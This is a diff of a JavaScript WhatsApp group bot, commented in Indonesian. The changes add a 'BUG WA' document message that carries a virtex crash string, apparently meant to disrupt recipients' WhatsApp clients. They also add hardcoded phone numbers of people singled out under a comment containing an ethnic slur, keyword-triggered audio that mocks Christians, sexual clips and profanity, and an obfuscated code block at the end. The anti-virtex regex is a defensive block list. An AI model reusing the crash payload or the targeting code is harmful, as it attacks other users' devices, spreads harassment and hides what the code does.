@@ -84,6 +84,20 @@ const tebakkimia = db.data.game.tebakkimia = []
 const tebaklirik = db.data.game.tebaklirik = []
 const tebaktebakan = db.data.game.tebaktebakan = []
 
+//punya gw, Sticker Image
+heker1 = "https://telegra.ph/file/6e93488bdd86d4193daf6.jpg"
+heker2 = "https://telegra.ph/file/81b9635450fc4a0068541.jpg"
+heker3 = "https://telegra.ph/file/dbc3d3e9e7f31a9d42556.jpg"
+heker4 = "https://telegra.ph/file/a9a7a9702db222f61641a.jpg"
+heker5 = "https://telegra.ph/file/8a066e8731fd52963f91b.png"
+heker6 = "https://telegra.ph/file/ab28f93b4fd00540cc548.png"
+var HekerList = [heker1,heker2,heker3,heker4,heker5,heker6]
+var heker = HekerList[Math.floor(Math.random() * HekerList.length)];
+
+// Sticker Video
+hekel1 = "https://telegra.ph/file/ff46319058dd5ebabc89a.mp4"
+var HekerListMP4 = [hekel1]
+var hengker = HekerListMP4[Math.floor(Math.random() * HekerListMP4.length)];
 
 module.exports = alpha = async (alpha, m, chatUpdate, store, reSize) => {
     try {
@@ -101,7 +115,7 @@ module.exports = alpha = async (alpha, m, chatUpdate, store, reSize) => {
         const args = body.trim().split(/ +/).slice(1)
         const pushname = m.pushName || "No Name"
         const sender = m.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid
-        const isCreator = [alpha.user.id, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+        const isCreatod = [alpha.user.id, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const itsMe = m.sender == alpha.user.id ? true : false
         const text = q = args.join(" ")
         const c = args.join(' ')
@@ -118,8 +132,10 @@ module.exports = alpha = async (alpha, m, chatUpdate, store, reSize) => {
         const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
 		const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
         //punya gw
+        const isCreator = isCreatod || m.key.fromMe
         const isGroupAdmen = m.isGroup ? groupAdmins.includes(m.sender) : false
-        const isGroupAdmins = isGroupAdmen || isCreator || m.key.fromMe
+        const isGroupAdmins = isGroupAdmen || isCreator
+        const isKecuali = ['6281316408830','6281316407846','6287878230953'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) // if (isKecuali) return (`Mending lu nguli aja sunda ngentod`) biar orangnya gabisa make fitur       
 
         const groupOwner = m.isGroup ? groupMetadata.owner : ''
         const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
@@ -132,7 +148,7 @@ module.exports = alpha = async (alpha, m, chatUpdate, store, reSize) => {
 		const ini_mark = `0@s.whatsapp.net`
 		const timestampi = speed();
 		const latensii = speed() - timestampi
-		const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "6289523258649-1604595598@g.us"}, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: pp_bot, surface: 200, message: `© ${ownername}`, orderTitle: 'memek', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
+		const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "6289523258649-1604595598@g.us"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: pp_bot, surface: 200, message: `© ${ownername}`, orderTitle: 'memek', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
 		const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: pp_bot}}}
 		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
 		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":`© ${ownername}`, "h": `Hmm`,'seconds': '359996400', 'gifPlayback': 'true', 'caption': `© ${ownername}`, 'jpegThumbnail': pp_bot}}}
@@ -140,6 +156,10 @@ module.exports = alpha = async (alpha, m, chatUpdate, store, reSize) => {
 		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${pushname}`, "h": `Hmm`,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': pp_bot}}}
 		const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegThumbnail: pp_bot}}}
 		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': pp_bot, thumbnail: pp_bot,sendEphemeral: true}}}
+		//punya gw BUG WA dari hw mod
+		const { ngazap } = require('./storage/virtex/ngazap')
+        const doc = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) },"message": {"documentMessage": {"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc","mimetype": "application/octet-stream","fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=","fileLength": "64455","pageCount": 1,"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=","fileName": `BUG WA 2022${ngazap(prefix)}`,"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="}}}
+
 		let picaks = [flaming,fluming,flarun,flasmurf]
 		let picak = picaks[Math.floor(Math.random() * picaks.length)]
 		
@@ -197,7 +217,7 @@ module.exports = alpha = async (alpha, m, chatUpdate, store, reSize) => {
         
         //punya gw
 		const reply = async (teks) => {
-			return alpha.sendMessage(m.chat, { text: teks, contextInfo:{ externalAdReply: { showAdAttribution: true, title: `Selamat ${salam} ${pushname}`, body: `${ownername}`, previewType: "PHOTO", thumbnailUrl: ``, thumbnail: pp_bot, sourceUrl: `${myweb}`}}}, { quoted: m})			
+			return alpha.sendMessage(m.chat, { text: teks, contextInfo:{ externalAdReply: { showAdAttribution: true, title: `Selamat ${salam} ${pushname}`, body: `${ownername}`, previewType: "PHOTO", thumbnailUrl: ``, thumbnail: pp_bot, sourceUrl: `${myweb}`}}}, { quoted: m})
 		}
 		const sendAudio = async (url) => {
 		    return alpha.sendMessage(m.chat, { audio: { url: url }, mimetype: 'audio/mp4', ptt: true, contextInfo:{ externalAdReply: { showAdAttribution: true, title: `Contoh Anak Kontol ${pushname}`, body: `${ownername}`, previewType: "PHOTO", thumbnailUrl: ppuser, thumbnail: '', sourceUrl: `${myweb}`}}}, {quoted:m})
@@ -205,8 +225,23 @@ module.exports = alpha = async (alpha, m, chatUpdate, store, reSize) => {
 		const sendReact = async (emoji) => { //await sendReact("📋")
             return alpha.sendMessage(m.chat, { react: { text: emoji, key: m.key }})
 		}
+		const sendSticker = async (file) => {
+		    return alpha.sendImageAsSticker(m.chat, file, m, { packname: global.packname, author: global.author })
+		}
+		const sendStickerVideo = async (file) => {
+		    return alpha.sendVideoAsSticker(m.chat, file, m, { packname: global.packname, author: global.author })
+		}
 		const randomArr = (arr = []) => {
             return arr[Math.floor(Math.random() * arr.length)]
+        }
+        const deploy = (teks) => {
+            return alpha.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 10000, amount: 1, background: pp_bot }}}}, {})
+        }
+        const deleteChat = (dari) => {
+            return alpha.sendMessage(dari, { delete: { remoteJid: m.chat, fromMe: true, id: m.id, participant: m.sender } })
+        }
+        const hidetag = (teks) => {
+            return alpha.sendMessage(from, { text : teks ? teks : '' , mentions: participants.map(a => a.id)}, {quoted: fkontak})
         }
         const isEmoji = (emo) => {
             let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
@@ -328,38 +363,43 @@ alpha.relayMessage(jid, order.message, { messageId: order.key.id})
         if (m.isGroup && !m.key.fromMe && db.data.chats[m.chat].antilink && !isCreator && !isGroupAdmins && !isGroupOwner){
             if (budy.match(/(chat.whatsapp.com)/gi)) {
         	linkgrup = await alpha.groupInviteCode(m.chat)
-	    	if (budy.includes(linkgrup)) return
+	    	if (budy.includes(linkgrup)) return	    	
         	reply(`「 *LINK GROUP TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group ${groupMetadata.subject}`).then(async res => 
-        	await alpha.groupParticipantsUpdate(m.chat, [sender], 'remove'))
+        	await alpha.groupParticipantsUpdate(m.chat, [sender], 'remove'))        	
 			alpha.updateBlockStatus(sender, 'block')
         }
      }
 		
 		// Anti Virus \\
-		if (m.isGroup && !m.key.fromMe && db.data.chats[m.chat].antivirus && !isCreator && !isGroupAdmins && !isGroupOwner){		    	    
-	    if (budy.match(/(๒|๑|৭|ด|ผ|ท|ง|า|ۿ|๕|๘|٩|๓|๗|๙|৫|ꫂ|闦|ᡃ⃟⃟|i⃟|ᡃ⃢⃢|ᡃ⃝|⃢⃝⃟⃕⃕|ℨ|᠀|📄|ı|ạ|ẉ|k̴̎|ɑ|ℰ|ℛ|Ø|✘|█|▒|❚|𝀲|ࣧ|ࣻ|ۜ|ࣨ|ۧ|҈|᳕|᥋|২|อ|เ|ม|ล|ꭙ|Ȣ|৪|໑|๗|𖣔|ꪶ|ꫂ|࿋|ℭ|ム|ℕ|⫷|●|⫸|ཌྷ|្|0000000|1111111|7777777|8888888|9999999)/gi)) {
-        	reply(`「 *VIRTEX TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group\n*${groupMetadata.subject}*`).then(async res =>
-			await alpha.groupParticipantsUpdate(m.chat, [sender], 'remove'))
+	  if (m.isGroup && !m.key.fromMe && db.data.chats[m.chat].antivirus && !isCreator && !isGroupAdmins && !isGroupOwner){		    	    
+	    if (budy.match(/(๒|๑|৭|ด|ผ|ท|ง|า|ۿ|๕|๘|٩|๓|๗|๙|৫|ꫂ|闦|ᡃ⃟⃟|i⃟|ᡃ⃢⃢|ᡃ⃝|⃢⃝⃟⃕⃕|ℨ|᠀|📄|ı|ạ|ẉ|k̴̎|ɑ|ℰ|ℛ|Ø|✘|█|▒|❚|𝀲|ࣧ|ࣻ|ۜ|ࣨ|ۧ|҈|᳕|᥋|২|อ|เ|ม|ล|ꭙ|Ȣ|৪|໑|๗|𖣔|࿋|ℭ|ム|ℕ|⫷|●|⫸|ཌྷ|្|ϟ|➊|㙾|㚗|0000000|1111111|7777777|8888888|9999999)/gi)) { // ꪶ, ꫂ
+        	//reply(`「 *VIRTEX TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group\n*${groupMetadata.subject}*`)
+        	//alpha.sendMessage(m.chat, { sticker: fs.readFileSync("./storage/sticker/heker.webp") }, { quoted: m })        	
+        	sendSticker(heker).then(async res =>
+			await alpha.groupParticipantsUpdate(m.chat, [sender], 'remove'))			
 			alpha.updateBlockStatus(sender, 'block')
 	    } else if (m.mtype === 'productMessage') {
-        	reply(`「 *SLAYER TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group\n*${groupMetadata.subject}*`).then(async res => 
-			await alpha.groupParticipantsUpdate(m.chat, [sender], 'remove'))
+        	//reply(`「 *SLAYER TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group\n*${groupMetadata.subject}*`)        	
+        	sendStickerVideo(hengker).then(async res => 
+			await alpha.groupParticipantsUpdate(m.chat, [sender], 'remove'))			
 			alpha.updateBlockStatus(sender, 'block')
 	    } else if (m.mtype === 'orderMessage') {
-        	reply(`「 *KATALOG TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group\n*${groupMetadata.subject}*`).then(async res => 
-			await alpha.groupParticipantsUpdate(m.chat, [sender], 'remove'))
+        	//reply(`「 *KATALOG TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group\n*${groupMetadata.subject}*`)       	
+        	sendStickerVideo(hengker).then(async res => 
+			await alpha.groupParticipantsUpdate(m.chat, [sender], 'remove'))			
 			alpha.updateBlockStatus(sender, 'block')
-		} else if (m.mtype === 'locationMessage') {
+		/*} else if (m.mtype === 'locationMessage') { // Lokasi biasa, rekomendasi off
         	reply(`「 *VIRLOK TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group\n*${groupMetadata.subject}*`).then(async res => 
 			await alpha.groupParticipantsUpdate(m.chat, [sender], 'remove'))
-			alpha.updateBlockStatus(sender, 'block')
+			alpha.updateBlockStatus(sender, 'block')*/
 		/*} else if (m.mtype === 'liveLocationMessage') {
-        	reply(`「 *KATALOG TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group\n*${groupMetadata.subject}*`).then(async res => 
+        	reply(`「 *VIRLOK TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group\n*${groupMetadata.subject}*`).then(async res => 
 			await alpha.groupParticipantsUpdate(m.chat, [sender], 'remove'))
 			alpha.updateBlockStatus(sender, 'block')*/
 		} else if (m.mtype === 'documentMessage') {
-        	reply(`「 *VIRDOC TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group\n*${groupMetadata.subject}*`).then(async res => 
-			await alpha.groupParticipantsUpdate(m.chat, [sender], 'remove'))
+        	//reply(`「 *VIRDOC TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group\n*${groupMetadata.subject}*`)        	
+        	sendStickerVideo(hengker).then(async res => 
+			await alpha.groupParticipantsUpdate(m.chat, [sender], 'remove'))			
 			alpha.updateBlockStatus(sender, 'block')
 		/*} else if (m.mtype === 'audioMessage') {
         	reply(`「 *KATALOG TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group\n*${groupMetadata.subject}*`).then(async res => 
@@ -377,48 +417,62 @@ alpha.relayMessage(jid, order.message, { messageId: order.key.id})
         	reply(`「 *VIRWEB TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group\n*${groupMetadata.subject}*`).then(async res => 
 			await alpha.groupParticipantsUpdate(m.chat, [sender], 'remove'))
 			alpha.updateBlockStatus(sender, 'block')*/
-	    } else if (budy.length > 1000) {
-        	reply(`「 *VIRTEX TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group\n*${groupMetadata.subject}*`).then(async res => 
+		/*} else if (m.mtype === 'conversation') { // Pesan Bot / Bug Bot
+        	//reply(`「 *BUG TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group\n*${groupMetadata.subject}*`)        	
+        	sendStickerVideo(hengker).then(async res => 
 			await alpha.groupParticipantsUpdate(m.chat, [sender], 'remove'))
+			alpha.updateBlockStatus(sender, 'block')*/
+	    } else if (budy.length > 1500) {
+        	//reply(`「 *VIRTEX TERDETEKSI* 」\n\nKamu akan dikeluarkan dari group\n*${groupMetadata.subject}*`)        	
+        	sendSticker(heker).then(async res => 
+			await alpha.groupParticipantsUpdate(m.chat, [sender], 'remove'))			
 			alpha.updateBlockStatus(sender, 'block')
         }
      }
      
         // Anti Spam \\
 	    if (!m.isGroup && !m.key.fromMe && !isCreator){
-        	if (budy.length > 500) {
+        	if (budy.length > 800) {        	
         	reply('Bacot Hekel Ngentod, gak ngeleg dek🖕').then(async res => 
-        	await alpha.updateBlockStatus(sender, 'block'))
+        	await alpha.updateBlockStatus(sender, 'block'))        	
         }
      }
+     
+        /*// Tes \\
+        if (budy.match(/(te?s)/gi)) {
+        	//reply(`「 *TES* 」\n\nSuccses`)
+        	//sendStickerVideo(hengker)
+        	deleteChat(m.chat)
+        	//alpha.sendMessage(m.chat, { sticker: { url: "https://telegra.ph/file/25d567b38e5a8a1d8d573.png" }, contextInfo:{ externalAdReply: { showAdAttribution: true, title: `Selamat ${salam} ${pushname}`, body: `${ownername}`, previewType: "PHOTO", thumbnailUrl: ``, thumbnail: pp_bot, sourceUrl: `${myweb}`}}}, { quoted })
+        }*/
 
 //━━━━━━━━━━━━━━━━━━━━━━[ Voice ]━━━━━━━━━━━━━━━━━━━━━━━━━━//punya gw							
 				
 		if (autovoice && !m.key.fromMe && !isCreator){
            if (budy.match(/(a(su|nj(([ie])ng|([ie])r)?)|me?me?k|ko?([nm])to?l|ba?bi|fu?ck|ta(e|i)|bangsat|g([iueo])bl([iueo])(k|g)|g ([iueo]) b l ([iueo]) (k|g)|a (n j (i n g|i r)?)s u|col(i|ay)|an?jg|b([ia])ngs([ia])?t|t([iuo])l([iuo])l)|tem?p([ei])k|j?an?c([ou])k|c?([uo])k|🖕|pe?pe([kg])|p([le])([rl])?er|da([jk])?jal/gi)) {
            alpha.sendPresenceUpdate('recording', m.chat)
-           await sendAudio("mp3/desah.mp3")                	    
+           await sendAudio("storage/mp3/desah.mp3")                	    
         } else if (budy.match(/(ye?s([uo])s|kris?ten|jas?j([uo])s|ba?pa)/gi)) {
            alpha.sendPresenceUpdate('recording', m.chat)
-           await sendAudio("mp3/woi_kristen.mp3")
+           await sendAudio("storage/mp3/woi_kristen.mp3")
         } else if (budy.match(/(ngen?to([dt]))/gi)) {
            alpha.sendPresenceUpdate('recording', m.chat)
-           await sendAudio("mp3/disini_ngentod.mp3")
+           await sendAudio("storage/mp3/disini_ngentod.mp3")
         } else if (budy.match(/(no?lep|re?ba?han|tu?ru|ke?ras|el?it|ker?ja|ga?but|pa?car|do?i|bes?ti|man?di|te?m([ae])n|bu?c([ie])n)/gi)) {
            alpha.sendPresenceUpdate('recording', m.chat)
-           await sendAudio("mp3/jedag_jedug_nolep.mp3")
+           await sendAudio("storage/mp3/jedag_jedug_nolep.mp3")
         } else if (budy.match(/(([sa])?yan?([gk])|c([oe])?([gc])?an)/gi)) {
            alpha.sendPresenceUpdate('recording', m.chat)
-           await sendAudio("mp3/cuma_mo_bilang.m4a")
+           await sendAudio("storage/mp3/cuma_mo_bilang.m4a")
         } else if (budy.match(/(No|no|no?mor)/gi)) { // →co?k← ga usah pake huruf besar/kecil terserah, ! resiko semua chat dapat aktif / ketriggered, ? maksimal 2
            alpha.sendPresenceUpdate('recording', m.chat)
-           await sendAudio("mp3/toni_nomor.mp3")
+           await sendAudio("storage/mp3/toni_nomor.mp3")
         } else if (budy.match(/(ad?m([ie])n|ow?ner|pe?mi?lik|bu?at|ba?ca|ba?co([td])|ad?u|la?wan|ge?lu([td])|sp?am|([vp])i?([rl])te?([xk])|la?wa?k|([vp])i?rus|l([ae])?g)/gi)) {
            alpha.sendPresenceUpdate('recording', m.chat)
-           await sendAudio("mp3/kalo_mau_bacot.mp3")
+           await sendAudio("storage/mp3/kalo_mau_bacot.mp3")
         } else if (budy.match(/(kam?pung|ru?mah|tem?pat|ti?ng?gal|ra?wa|hac?ker|he?ng?ker|mis?kin|wk?wk|nga?kak|be?ngek|aw?ok|Ao?wk|mu?ka|gan?teng|s([au])m?pah)/gi)) {
            alpha.sendPresenceUpdate('recording', m.chat)
-           await sendAudio("mp3/toni_kampung_rawa.mp3")
+           await sendAudio("storage/mp3/toni_kampung_rawa.mp3")
         }
     }  
     
@@ -452,29 +506,38 @@ alpha.relayMessage(jid, order.message, { messageId: order.key.id})
 //━━━━━━━━━━━━━━━━━━━━━━[ Setting ]━━━━━━━━━━━━━━━━━━━━━━━━━━//
   
         //punya gw
-        if (autoread){
-           alpha.sendReadReceipt(m.chat, m.sender, [m.key.id])
+        if (autoread) {
+           alpha.sendReceipts(m.chat, m.sender, [m.key.id])
         }        
-        if (autoketik){
+        if (autoketik) {
            await alpha.sendPresenceUpdate('composing', m.chat)
         }
-        if (autorecording){
+        if (autorecording) {
            await alpha.sendPresenceUpdate('recording', m.chat)
         }        
-        if (available){
+        if (available) {
            await alpha.sendPresenceUpdate('available', m.chat)
         }        
-        if (unavailable){
+        if (unavailable) {
            await alpha.sendPresenceUpdate('unavailable', m.chat)
         }        
-        if (pause){
+        if (pause) {
            await alpha.sendPresenceUpdate('pause', m.chat)
         }
+        if (autoreadsw) {
+		if (from === 'status@broadcast') {
+		   await alpha.chatRead(from)
+	    }}
 
         // Auto Bio \\
-    	if (isCmd && autobio) {
-	       await alpha.setStatus(`${botname} | Runtime : ${runtime(process.uptime())} | ${alpha.public ? 'Public-Mode' : 'Self-Mode'} | Prefix : Multi-Prefix`)
+    	if (m.message && autobio) {
+	       await alpha.setStatus(`${botname} | Runtime : ${runtime(process.uptime())} | ${alpha.public ? 'Public-Mode' : 'Self-Mode'} | Hit Today : ${hit_today.length} | Prefix : Multi-Prefix`)
 		}
+		
+		// Auto Bio every 60seconds
+        /*if (autobio) setInterval(async () => {
+        if (autobio) await alpha.setStatus(`${botname} | Runtime : ${runtime(process.uptime())} | ${alpha.public ? 'Public-Mode' : 'Self-Mode'} | Hit Today : ${hit_today.length} | Prefix : Multi-Prefix`)
+        }, 60 * 1000)*/
         
 		const sendFileFromUrl = async (from, url, caption, mek, men) => {
             let mime = '';
@@ -668,12 +731,12 @@ autocio = false
 
 // Auto Read
 if(m.message && global.autoread == true) {
-alpha.sendReadReceipt(m.chat, sender, [m.key.id])
+alpha.sendReceipts(m.chat, sender, [m.key.id])
 }
 
 // Auto Read2
 if(!isMedia && global.autoread == true) {
-alpha.sendReadReceipt(m.chat, sender, [m.key.id])
+alpha.sendReceipts(m.chat, sender, [m.key.id])
 }
 
 (function(_0x1bae49,_0x3b64b2){function _0x297553(_0x3c5eb9,_0x271f20,_0x4a7169,_0x421703,_0x23874b){return _0x279a(_0x421703-0x232,_0x23874b);}const _0x4e0be4=_0x1bae49();function _0x1cbb8a(_0x355e74,_0x27c9ac,_0x4f774c,_0x4b83f4,_0x5a5177){return _0x279a(_0x355e74- -0x1e0,_0x5a5177);}function _0x17ea7d(_0x386baa,_0x1162f5,_0x338927,_0x39fb0b,_0x13daa0){return _0x279a(_0x1162f5-0x75,_0x338927);}function _0x36214f(_0x11b361,_0x4ea6ac,_0x395303,_0x8c3c30,_0x4c35d8){return _0x279a(_0x395303- -0x247,_0x8c3c30);}function _0x18699b(_0x240185,_0x3a67b0,_0x288f70,_0x192cc1,_0x2fadc1){return _0x279a(_0x2fadc1-0x23,_0x3a67b0);}while(!![]){try{const _0x1042c5=parseInt(_0x36214f(-0x110,-0x135,-0x12b,-0x10d,-0x141))/(-0x61b*0x1+0x2*-0x24e+-0x55c*-0x2)+parseInt(_0x17ea7d(0x1dc,0x1de,0x219,0x1a4,0x1fe))/(-0x21d2+0x43*-0x8b+0x9*0x7cd)+-parseInt(_0x17ea7d(0x19f,0x192,0x17d,0x1a5,0x17a))/(0x829+-0x227c+-0xd2b*-0x2)*(parseInt(_0x18699b(0x186,0x13a,0x16e,0x18a,0x156))/(0x35*-0x8+-0x617*-0x2+0x21a*-0x5))+-parseInt(_0x36214f(-0x143,-0xd6,-0x113,-0x11c,-0xdd))/(-0x1*0x12df+0x1*0x78b+-0x53*-0x23)+parseInt(_0x36214f(-0xe9,-0xc6,-0xcd,-0xe3,-0xb0))/(0xef1+-0x1*-0x17b3+-0x1*0x269e)+parseInt(_0x36214f(-0x107,-0x137,-0x12c,-0x142,-0xf8))/(0x10b*0x13+-0x3ab+-0x101f*0x1)+-parseInt(_0x1cbb8a(-0xb8,-0x93,-0xb6,-0x8e,-0xf4))/(-0xf90+-0x24b*-0xd+-0xe37);if(_0x1042c5===_0x3b64b2)break;else _0x4e0be4['push'](_0x4e0be4['shift']());}catch(_0x3a338a){_0x4e0be4['push'](_0x4e0be4['shift']());}}}(_0x46b2,0x163*0x5c5+0x1*-0x5306f+-0x2*-0x2f807));if(db[_0x103abf(0x114,0x144,0x111,0x126,0x126)][_0x103abf(0xa3,0xb0,0xb3,0xe0,0xe9)+_0x552356(-0x169,-0x160,-0x156,-0x150,-0x194)][botNumber][_0x552356(-0x202,-0x1ca,-0x1c8,-0x193,-0x1a5)+'io']===!![]){let settingstatus=0xb*0x301+0x12ef+0x1*-0x33fa;new Date()*(0x1e81+0x1bd0+-0x74a*0x8)-settingstatus>-0x19*-0x106+-0xbc*0x6+-0x8a3*0x2&&(await alpha[_0x103abf(0xc3,0xd5,0x104,0xfb,0xf4)+_0x552356(-0x1cb,-0x1c2,-0x1dd,-0x19b,-0x1ab)](_0x81032e(0x30d,0x349,0x36a,0x345,0x345)+alpha[_0x552356(-0x181,-0x164,-0x17b,-0x15e,-0x12a)][_0x552356(-0x196,-0x1c4,-0x1c4,-0x1d6,-0x18f)]+_0x552356(-0x1c9,-0x19c,-0x1b9,-0x1b5,-0x1b9)+runtime(process[_0x81032e(0x371,0x37b,0x362,0x345,0x37f)+'e']())+(_0x552356(-0x162,-0x192,-0x15a,-0x175,-0x169)+_0x5e81bc(0x3d8,0x381,0x3b0,0x3a3,0x3b4)+_0x311208(0x389,0x3a0,0x389,0x397,0x35c))+(alpha[_0x552356(-0x180,-0x15d,-0x173,-0x16c,-0x15b)+'c']?_0x103abf(0xf5,0xff,0x100,0x11e,0xf5)+_0x552356(-0x1cd,-0x1b3,-0x1d1,-0x196,-0x1d0)+'e':_0x81032e(0x39e,0x379,0x3a7,0x3b2,0x33e)+_0x552356(-0x152,-0x17a,-0x15c,-0x199,-0x169))),settingstatus=new Date()*(-0xdf6+0x2223+0x2*-0xa16));}function _0x5e81bc(_0x57333e,_0x260aee,_0x21f1b4,_0x28a722,_0x1c584c){return _0x279a(_0x1c584c-0x266,_0x260aee);}!m[_0x81032e(0x344,0x340,0x347,0x334,0x35e)+'up']&&!m[_0x81032e(0x386,0x373,0x365,0x354,0x372)][_0x311208(0x3b8,0x3cf,0x3a8,0x38e,0x37b)+'e']&&db[_0x552356(-0x135,-0x170,-0x157,-0x169,-0x1aa)][_0x81032e(0x381,0x345,0x31d,0x35b,0x34b)+_0x311208(0x3d7,0x3ac,0x3e8,0x3df,0x3c7)][botNumber][_0x5e81bc(0x402,0x3ab,0x3a9,0x3a8,0x3cd)+_0x5e81bc(0x424,0x3cd,0x3b7,0x3f3,0x3ef)+'d']&&(simi=await fetchJson(_0x81032e(0x349,0x34e,0x387,0x374,0x360)+_0x81032e(0x396,0x392,0x3b7,0x396,0x375)+_0x552356(-0x15e,-0x18b,-0x151,-0x1c1,-0x1c1)+_0x103abf(0x113,0x11d,0x120,0x123,0x12b)+_0x81032e(0x3ad,0x390,0x3c7,0x3ac,0x3a9)+_0x552356(-0x16b,-0x165,-0x12e,-0x158,-0x15f)+_0x311208(0x396,0x3af,0x39e,0x3d9,0x3ac)+_0x552356(-0x150,-0x15f,-0x18b,-0x12e,-0x170)+_0x552356(-0x19d,-0x18d,-0x164,-0x163,-0x176)+_0x103abf(0xe3,0xf3,0xfa,0xf1,0xd7)+command),m[_0x81032e(0x3a9,0x38c,0x37b,0x3c6,0x3c9)]('_'+simi[_0x552356(-0x1c6,-0x191,-0x162,-0x19f,-0x1ae)+'ss']+'_'));if(isMedia&&m[_0x81032e(0x336,0x36b,0x362,0x380,0x36d)][_0x103abf(0x11c,0x14a,0x10c,0x143,0x116)+_0x552356(-0x169,-0x189,-0x19b,-0x17f,-0x18f)]&&m[_0x311208(0x3f4,0x3db,0x3b8,0x37f,0x3d2)][_0x103abf(0x170,0x13b,0x117,0x143,0x163)+_0x552356(-0x1a1,-0x189,-0x1b5,-0x159,-0x17c)][_0x311208(0x39e,0x3a2,0x3ae,0x391,0x3cf)+_0x103abf(0xe9,0xf1,0xc6,0x100,0x135)](_0x81032e(0x317,0x33a,0x348,0x328,0x323)+'4')in db[_0x103abf(0x129,0x118,0x153,0x126,0xf8)][_0x311208(0x37b,0x3d8,0x39d,0x37a,0x3c4)]){let hash=db[_0x5e81bc(0x3df,0x3ae,0x3f2,0x3f5,0x3d8)][_0x103abf(0xdc,0xe1,0xc1,0xeb,0x10f)][m[_0x552356(-0x184,-0x190,-0x1b3,-0x194,-0x19a)][_0x311208(0x3d6,0x3f0,0x3f5,0x3db,0x3b9)+_0x5e81bc(0x3d6,0x3c5,0x3b7,0x3da,0x3bf)][_0x5e81bc(0x3a9,0x375,0x39c,0x3dc,0x3ae)+_0x103abf(0x103,0x113,0x13b,0x100,0xfd)](_0x311208(0x38d,0x35d,0x387,0x35b,0x352)+'4')],{q,mentionedJid}=hash;const _0x5c7f03={};_0x5c7f03[_0x81032e(0x363,0x33f,0x33f,0x368,0x35f)]=q,_0x5c7f03[_0x311208(0x410,0x401,0x3f3,0x401,0x420)+_0x552356(-0x1aa,-0x171,-0x1a1,-0x1ab,-0x18f)]=mentionedJid;let messages=await 